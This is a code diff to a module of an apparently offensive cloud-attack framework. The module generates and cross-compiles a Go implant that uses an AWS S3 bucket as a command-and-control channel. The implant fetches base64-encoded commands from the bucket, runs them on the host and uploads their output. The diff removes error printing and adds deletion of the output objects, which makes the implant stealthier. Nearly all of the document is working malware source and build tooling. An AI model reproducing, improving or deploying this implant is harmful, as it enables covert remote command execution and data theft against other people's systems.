@@ -3,7 +3,7 @@ import os
 import string
 import random
 import sys
-
+import subprocess
 import mongoengine
 
 from core.database.models import S3C2Listener, S3C2Particle
@@ -49,27 +49,41 @@ description = "A Go stager for AWS S3 listener"
 
 aws_command = "None"
 
-def python_code_generate(bucket, accesskey, secretkey, region, commandkey, outputkey, kmskey):
+def python_code_generate(bucket, accesskey, secretkey, region, commandkey, outputkey, kmskey, goos, goarch):
     gocode = f"""
+
+package main
+
+var accessKey = "{accesskey}"
+var secretKey = "{secretkey}"
+var bucket = "{bucket}"
+var key = "{commandkey}"
+var newKey = "{outputkey}"
+var kmsKeyID = "{kmskey}"
+var region = "{region}"
+
+"""
+
+    oldgocode = f"""
 package main
 
 import (
-       "bytes"
-       "context"
-       "io/ioutil"
+    "bytes"
+    "context"
+    "io/ioutil"
     "encoding/base64"
-    "fmt"
-       "github.com/aws/aws-sdk-go-v2/aws"
+    
+    "github.com/aws/aws-sdk-go-v2/aws"
     "github.com/aws/aws-sdk-go-v2/config"
     "github.com/aws/aws-sdk-go-v2/credentials"
     "github.com/aws/aws-sdk-go-v2/service/s3"
     "github.com/aws/aws-sdk-go-v2/service/s3/types"
 
     "os"
-       "math/rand"
-       "time"
-       "os/exec"
-       "strings"
+    "math/rand"
+    "time"
+    "os/exec"
+    "strings"
 )
 
 const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
@@ -99,9 +113,7 @@ func fileExists(filename string) bool {{
 
 func decodeBase64(encoded string) (string, error) {{
     decodedBytes, err := base64.StdEncoding.DecodeString(encoded)
-    if err != nil {{
-        fmt.Println(err)
-    }}
+    if err != nil {{}}
     return string(decodedBytes), nil
 }}
 
@@ -115,7 +127,7 @@ func main() {{
         config.WithRegion(region),
         config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(accessKey, secretKey, "")),
     )
-    if err != nil {{fmt.Println(err)}}
+    if err != nil {{}}
 
     s3Client := s3.NewFromConfig(cfg)
 
@@ -133,16 +145,14 @@ func main() {{
             particlename := String(10)
             f, err := os.Create("./.particle")
             _, err = f.WriteString(particlename)
-            if err != nil{{
-                fmt.Println(err)
-            }}
+            if err != nil{{}}
         }}
 
     }}else {{
         particlename = String(10)
         f, err := os.Create("./.particle")
         _, err = f.WriteString(particlename)
-        if err != nil{{fmt.Println(err)}}
+        if err != nil{{}}
     }}
 
     particlepath := particlename + "/"
@@ -156,7 +166,6 @@ func main() {{
             }})
 
         if err != nil {{
-            fmt.Println(err)
             _, err = s3Client.PutObject(context.TODO(), &s3.PutObjectInput{{
                 Bucket: aws.String(bucket),
                 Key:    aws.String(particlepath),
@@ -175,16 +184,16 @@ func main() {{
 
             encodedString, err := ioutil.ReadAll(getObjectOutput.Body)
             commandString, err := decodeBase64(string(encodedString))
-            if err != nil {{fmt.Println(err)}}
+            if err != nil {{}}
             if err == nil {{
                 if commandString == "exit_particle_shell"{{
                     break
                 }}
                 commands := strings.Split(commandString, " ")
-                fmt.Println(commandString)
+                
                 command := commands[0]
                 args := commands[1:]
-                fmt.Println(commandString)
+                
                 cmd := exec.Command(command, args...)
 
                 output, err := cmd.CombinedOutput()
@@ -196,7 +205,13 @@ func main() {{
                         ServerSideEncryption: types.ServerSideEncryptionAwsKms,
                         SSEKMSKeyId:          aws.String(kmsKeyID),
                     }})
-                    if err != nil {{fmt.Println(err)}}}}
+                    if err != nil {{}}
+                    
+                    _, err = s3Client.DeleteObject(context.TODO(), &s3.DeleteObjectInput{{
+                        Bucket: aws.String(bucket),
+                        Key:    aws.String(particleoutput),
+                    }})
+                }}
 
                 if err == nil{{
                     _, err = s3Client.PutObject(context.TODO(), &s3.PutObjectInput{{
@@ -206,7 +221,11 @@ func main() {{
                         ServerSideEncryption: types.ServerSideEncryptionAwsKms,
                         SSEKMSKeyId:          aws.String(kmsKeyID),
                     }})
-                    if err != nil {{fmt.Println(err)}}
+                    if err != nil {{}}
+                    _, err = s3Client.DeleteObject(context.TODO(), &s3.DeleteObjectInput{{
+                        Bucket: aws.String(bucket),
+                        Key:    aws.String(particleoutput),
+                    }})
                 }}
             }}
         }}
@@ -214,11 +233,43 @@ func main() {{
 }}
     """
 
-    #if os.path.exists(f"core/module/stager/__golang_stager/{outputfilename}.go"):
-    #with open(f"core/module/stager/__golang_stager/{outputfilename}.go", "w") as binfile:
-    gocodeB64 = gocode.encode("ascii")
-    b64Bytes = base64.b64encode(gocodeB64)
+    with open("core/module/stager/__golang_s3_stager/credentials.go", "w") as credsfile:
+        credsfile.write(gocode)
+        credsfile.close()
+
+    b64Bytes = buildbinary(goos=goos, goarch=goarch)
+    os.remove("core/module/stager/__golang_s3_stager/credentials.go")
+    os.remove("core/module/stager/__golang_s3_stager/go.mod")
+    os.remove("core/module/stager/__golang_s3_stager/go.sum")
+
     return b64Bytes
+
+def buildbinary(goos, goarch):
+    work_dir = "core/module/stager/__golang_s3_stager"
+
+    try:
+        subprocess.run(["go", "mod", "init", "stager"], cwd=work_dir, check=True)
+
+        # Run go mod tidy
+        subprocess.run(["go", "mod", "tidy"], cwd=work_dir, check=True)
+
+        env = os.environ.copy()
+        env["GOOS"] = goos
+        env["GOARCH"] = goarch
+
+        subprocess.run(
+            ["go", "build", "-o", "stager"],
+            cwd=work_dir,
+            check=True,
+            env=env
+        )
+
+        binary_path = os.path.join(work_dir, "stager")
+        with open(binary_path, "rb") as f:
+            return {"code": base64.b64encode(f.read()).decode()}
+
+    except subprocess.CalledProcessError as e:
+        return {"error": f"Go build failed: {str(e)}"}
 
 def exploit(workspace):
     bucket = variables['LISTENER-BUCKET-NAME']['value']
@@ -250,8 +301,18 @@ def exploit(workspace):
         region=region,
         commandkey=commandkey,
         outputkey=outputfile,
-        kmskey=kmskey
+        kmskey=kmskey,
+        goos=goos,
+        goarch=goarch
     )
+
+    #if type(b64Bytes) != str:
+    #    b64Bytes = b64Bytes.decode()
+
+    if "error" in b64Bytes:
+        return {
+            "error": b64Bytes['error']
+        }
 
     if b64Bytes is None:
         return {
@@ -262,7 +323,7 @@ def exploit(workspace):
         "ModuleName": {
             "ModuleName": "Golang for S3 C2",
             "Status": "Successfully created",
-            "Code": b64Bytes.decode(),
+            "Code": b64Bytes['code'],
             "OutPutFile": outputfilename
         }
     }
